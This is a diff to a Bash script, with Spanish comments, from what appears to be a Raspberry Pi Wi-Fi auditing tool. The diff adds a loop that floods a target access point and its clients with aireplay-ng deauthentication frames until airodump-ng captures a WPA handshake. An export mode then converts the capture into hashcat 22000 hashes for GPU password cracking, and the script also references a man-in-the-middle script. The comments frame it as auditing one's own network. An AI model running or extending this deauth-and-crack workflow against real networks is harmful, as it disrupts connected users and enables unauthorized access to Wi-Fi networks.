@@ -7,11 +7,15 @@ ts(){ date +%H:%M:%S; }
 log(){ echo "[$(ts)] $*" > "$R"; }
 TBSSID="$1"; TCH="$2"; OWN=0; CLI=""; SSID=""
 trap 'systemctl start kismet-sensor.service 2>/dev/null' EXIT
+WLAN0_MAC=$(cat /sys/class/net/wlan0/address 2>/dev/null)
 
-if [ -z "$TBSSID" ]; then
-  TBSSID=$(cat /sys/class/net/wlan0/address 2>/dev/null)
-  TCH=$(iw dev wlan0 info 2>/dev/null | awk '/channel/{print $2}')
-  SSID=$(iw dev wlan0 info 2>/dev/null | awk '/ssid/{print $2}')
+# AP propio = BSSID vacio O coincide con el de wlan0. El "Crack en GPU" resuelve el BSSID
+# propio y lo pasa EXPLICITO, asi que hay que reconocerlo como propio para detectar clientes
+# via 'iw station dump' (fiable) en vez de airodump (no ve un cliente idle en self-AP).
+if [ -z "$TBSSID" ] || [ "$(echo "$TBSSID" | tr A-Z a-z)" = "$(echo "$WLAN0_MAC" | tr A-Z a-z)" ]; then
+  TBSSID="$WLAN0_MAC"
+  [ -z "$TCH" ] && TCH=$(iw dev wlan0 info 2>/dev/null | awk '/channel/{print $2}')
+  [ -z "$SSID" ] && SSID=$(iw dev wlan0 info 2>/dev/null | sed -n 's/^[[:space:]]*ssid //p')
   OWN=1
 fi
 
@@ -63,12 +67,12 @@ if [ -z "$TCH" ] || [ "$TCH" = "auto" ]; then
 fi
 
 iw dev wlan1 set channel "$TCH"
-log "canal $TCH - capturando 60s con 3 deauths dirigidos..."
+log "canal $TCH - capturando (early-exit al pillar handshake, max 50s)..."
 
 # Limpiar caps anteriores + zombies
 pkill -9 -f 'airodump-ng' 2>/dev/null
 sleep 0.3
-rm -f /tmp/wt-*.cap /tmp/wt-*.csv 2>/dev/null
+rm -f /tmp/wt-*.cap /tmp/wt-*.csv /tmp/wt-check.hc22000 2>/dev/null
 
 timeout 60 airodump-ng -c "$TCH" --bssid "$TBSSID" -w /tmp/wt wlan1 >/dev/null 2>/tmp/wt-cap.log &
 ADPID=$!
@@ -88,27 +92,89 @@ get_clients_csv(){
   ' "$csv" 2>/dev/null
 }
 
-# 3 bursts de deauth: t=5s, t=15s, t=25s
-# deauth dirigido si hay clientes en el CSV; broadcast como fallback
-sleep 5
-for burst in 1 2 3; do
+# ¿el .cap en curso ya tiene EAPOL/PMKID convertible a hash? (mismo tool que el export)
+have_handshake(){
+  local capnow
+  capnow=$(ls -t /tmp/wt-*.cap 2>/dev/null | head -1)
+  [ -z "$capnow" ] && return 1
+  rm -f /tmp/wt-check.hc22000
+  hcxpcapngtool --all -o /tmp/wt-check.hc22000 "$capnow" >/dev/null 2>&1
+  [ -s /tmp/wt-check.hc22000 ]
+}
+
+# Captura con EARLY-EXIT: deauth + comprobar handshake en bucle; salir en cuanto haya.
+# Antes eran 60s fijos aunque el handshake llegara en el segundo 5.
+sleep 3                                  # que airodump cree el .cap
+CAP_START=$SECONDS
+CAP_DEADLINE=$((CAP_START + 50))
+NOCLIENT_DEADLINE=$((CAP_START + 18))    # sin cliente NI handshake en 18s = no hay nada que capturar
+SEEN_CLIENT=0
+while [ "$SECONDS" -lt "$CAP_DEADLINE" ]; do
   CLIENTS=$(get_clients_csv)
   [ -z "$CLIENTS" ] && CLIENTS="$CLI"
   if [ -n "$CLIENTS" ]; then
+    SEEN_CLIENT=1
     for c in $CLIENTS; do
       timeout 3 aireplay-ng -0 5 -a "$TBSSID" -c "$c" wlan1 >/dev/null 2>&1
     done
   else
     timeout 3 aireplay-ng -0 5 -a "$TBSSID" wlan1 >/dev/null 2>&1
   fi
-  [ $burst -lt 3 ] && sleep 10
+  if have_handshake; then
+    log "handshake capturado en $((SECONDS - CAP_START))s - cerrando captura."
+    break
+  fi
+  # el handshake WPA EXIGE un cliente; sin ninguno asociado no hay nada que capturar -> cortar pronto
+  if [ "$SEEN_CLIENT" = 0 ] && [ "$SECONDS" -ge "$NOCLIENT_DEADLINE" ]; then
+    log "AP sin clientes asociados - abortando captura pronto."
+    break
+  fi
+  sleep 4
 done
 
-wait $ADPID 2>/dev/null
+kill "$ADPID" 2>/dev/null
+wait "$ADPID" 2>/dev/null
 
 CAPFILE=$(ls -t /tmp/wt-*.cap 2>/dev/null | head -1)
 CAP_SIZE=$(stat -c%s "$CAPFILE" 2>/dev/null || echo 0)
 
+# Resolver SSID desde el CSV de captura si aun esta vacio (caso BSSID+canal a mano).
+# mitm-attack.sh / NetworkManager exigen el SSID para conectar.
+if [ -z "$SSID" ] && [ "$OWN" != 1 ]; then
+  WCSV=$(ls -t /tmp/wt-*.csv 2>/dev/null | head -1)
+  SSID=$(grep -i "$TBSSID" "$WCSV" 2>/dev/null | head -1 | awk -F, '{gsub(/^ +| +$/,"",$14); print $14}')
+fi
+
+# ── Modo EXPORT: captura -> hash hashcat 22000 -> sale. (crack pesado = portatil GPU) ──
+# Uso: wifitest.sh <BSSID> <canal> export
+# El handshake WPA EXIGE un cliente conectado (el 4-way handshake solo ocurre al
+# conectarse un device). Sin cliente no hay nada que capturar -> mensaje claro.
+# NO se usa PMKID: hcxdumptool es agresivo (puede tumbar el AP/router) y muchos routers
+# no lo exponen. Para auditar tu wifi: que haya un dispositivo conectado al AP.
+if [ "$3" = "export" ]; then
+  CAPS=/opt/pinacola/captures
+  mkdir -p "$CAPS"
+  NOCOLON=$(echo "$TBSSID" | tr -d ':' | tr 'a-z' 'A-Z')
+  HOUT="$CAPS/$NOCOLON.hc22000"
+  rm -f "$HOUT"
+
+  if [ -n "$CAPFILE" ] && [ "$CAP_SIZE" -gt 24 ]; then
+    hcxpcapngtool --all -o "$HOUT" "$CAPFILE" 2>/dev/null
+  fi
+  NH=$(wc -l < "$HOUT" 2>/dev/null || echo 0)
+
+  if [ "${NH:-0}" -ge 1 ]; then
+    printf 'BSSID=%s\nSSID=%s\nCHANNEL=%s\n' "$TBSSID" "$SSID" "$TCH" > "$CAPS/$NOCOLON.meta"
+    log "OK Hash exportado -> $HOUT ($NH hash). Crackea en el portatil."
+  elif [ "${SEEN_CLIENT:-0}" = 0 ]; then
+    log "AP SIN CLIENTES conectados. El handshake WPA solo se captura cuando hay un dispositivo conectado al AP. Conecta un movil/PC al AP y reintenta."
+  else
+    log "El AP tiene clientes pero no se capturo el handshake esta vez. Reintenta (a veces hacen falta 2-3 intentos)."
+  fi
+  exit 0
+fi
+
+# A partir de aqui = crack LOCAL en la Pi: requiere captura con cap valido.
 if [ -z "$CAPFILE" ] || [ "$CAP_SIZE" -le 24 ]; then
   log "X  Sin captura (${CAP_SIZE}B). Sin clientes o wlan1 sin alcance."
   exit 0
